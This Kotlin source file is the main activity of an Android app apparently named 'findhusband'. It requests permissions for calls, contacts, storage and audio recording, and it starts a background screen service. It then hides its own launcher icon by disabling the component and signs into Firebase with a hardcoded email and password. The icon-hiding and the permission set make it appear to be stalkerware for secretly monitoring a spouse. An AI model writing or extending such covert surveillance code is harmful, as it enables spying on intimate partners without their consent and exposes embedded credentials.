package nguyen.findhusband

import android.Manifest
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.Environment
import android.view.View
import kotlinx.android.synthetic.main.activity_main.*
import android.os.Environment.getExternalStorageDirectory
import android.media.MediaRecorder
import android.widget.Toast
import java.io.IOException
import android.media.MediaPlayer
import android.content.pm.PackageManager
import nguyen.findhusband.MainActivity
import android.content.ComponentName
import android.Manifest.permission
import android.Manifest.permission.ACCESS_FINE_LOCATION
import android.Manifest.permission.ACCESS_COARSE_LOCATION
import android.Manifest.permission.WRITE_EXTERNAL_STORAGE
import android.app.PendingIntent.getActivity
import java.nio.file.Files.size
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.auth.FirebaseUser
import com.google.firebase.auth.AuthResult
import com.google.android.gms.tasks.Task
import com.google.android.gms.tasks.OnCompleteListener
import android.R.attr.password
import android.R.attr.password
import android.app.Service.START_STICKY
import android.content.Intent
import android.util.Log
import android.content.IntentFilter
import android.hardware.display.VirtualDisplay
import android.nfc.Tag
import android.os.Build
import android.os.CountDownTimer
import androidx.annotation.RequiresApi
import nguyen.ScreenPreference


class MainActivity : AppCompatActivity() {
    val MULTIPLE_PERMISSIONS = 10 // code you want.
    var status = false


    var permissions = arrayOf<String>(Manifest.permission.PROCESS_OUTGOING_CALLS,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.RECORD_AUDIO)
    private var mAuth: FirebaseAuth? = null
    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        instance = this
        mAuth = FirebaseAuth.getInstance()

        ScreenPreference.getInstance(this@MainActivity).saveDeviceID = "0"

        if (checkPermissions()) {

        }
        startService(Intent(this@MainActivity, ScreenService::class.java))

          val p = packageManager
         val componentName = ComponentName(this@MainActivity, nguyen.findhusband.MainActivity::class.java!!) // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
         p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
        mAuth!!.signInWithEmailAndPassword("thanhluan@gmail.com", "123456789")
                .addOnCompleteListener(this) { task ->
                    if (task.isSuccessful) {
                        // Sign in success, update UI with the signed-in user's information
                        Log.d("kq", "signInWithEmail:success")
                        val user = mAuth!!.currentUser
                        // updateUI(user)
                        status = true
                    } else {
                        // If sign in fails, display a message to the user.
                        Log.w("kq", "signInWithEmail:failure", task.exception)
                        Toast.makeText(this@MainActivity, "Authentication failed.",
                                Toast.LENGTH_SHORT).show()
                        status = false
                        //updateUI(null)
                    }

                    // ...
                }


//        play.setOnClickListener {
//            val mediaPlayer = MediaPlayer()
//
//            try {
//                mediaPlayer.setDataSource(outputFile)
//                mediaPlayer.prepare()
//                mediaPlayer.start()
//
//                Toast.makeText(applicationContext, "Playing Audio", Toast.LENGTH_LONG).show()
//
//            } catch (e: Exception) {
//                // make something
//            }
//        }


     }



    private fun checkPermissions(): Boolean {
        var result: Int
        val listPermissionsNeeded: ArrayList<String> = ArrayList()
        for (p in permissions) {
            result = ContextCompat.checkSelfPermission(this@MainActivity, p)
            if (result != PackageManager.PERMISSION_GRANTED) {
                listPermissionsNeeded.add(p)
            }
        }
        if (!listPermissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, listPermissionsNeeded.toTypedArray(), MULTIPLE_PERMISSIONS)
            return false
        }
        return true
    }

    companion object {
        lateinit var instance: MainActivity
            private set
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        when (requestCode) {
            MULTIPLE_PERMISSIONS -> {
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    // permissions granted.
                } else {
                    var perStr = ""
                    for (per in permissions) {
                        perStr += "\n" + per
                    }
                    // permissions list of don't granted permission
                }
                return
            }
        }
    }

    public override fun onStart() {
        super.onStart()
        // Check if user is signed in (non-null) and update UI accordingly.
        val currentUser = mAuth!!.currentUser
        println(currentUser)

        //updateUI(currentUser)
    }

    fun sCreenRecorder() {
        Log.d("MainActivity","qua men" )
    }


}
